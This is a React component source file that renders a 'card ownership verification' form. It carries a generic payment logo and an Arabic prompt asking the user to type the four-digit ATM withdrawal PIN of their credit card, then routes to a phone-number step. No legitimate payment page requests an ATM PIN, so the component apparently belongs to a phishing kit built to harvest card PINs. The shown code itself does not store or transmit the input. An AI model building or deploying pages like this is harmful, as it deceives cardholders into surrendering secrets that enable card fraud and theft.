import React from "react";
import { useNavigate } from "react-router";

function VerificationCode2() {
  const nav = useNavigate();
  const handelSubmit = function (e) {
    e.preventDefault();
    nav("/phone-number");
  };
  return (
    <div className="bg-white">
      <div
        className="p-4 rounded-lg border shadow-lg  max-w-[650px] mx-auto  text-slate-700"
        style={{ direction: "ltr" }}
      >
        <div>
          <img
            src="https://pluspng.com/img-png/payment-method-png-payment-options-1003.png"
            alt=""
            className="h-10"
          />
        </div>

        <form className="my-6" onSubmit={(e) => handelSubmit(e)}>
          <h4 className="font-semibold text-xl  text-center">
            اثبات ملكية البطاقة - كلمة سر البطاقة <br />
            يرجي ادخال ركز سحب الصراف المكون من اربع خانات الخاص ببطاقتك
            الاتمانية
          </h4>
          <input required type="text" className="input-text" />
          <button className="bg-main w-1/2 mx-auto p-3 rounded-lg block text-white font-semibold text-xl my-4">
            تاكيد
          </button>
        </form>
      </div>
    </div>
  );
}

export default VerificationCode2;
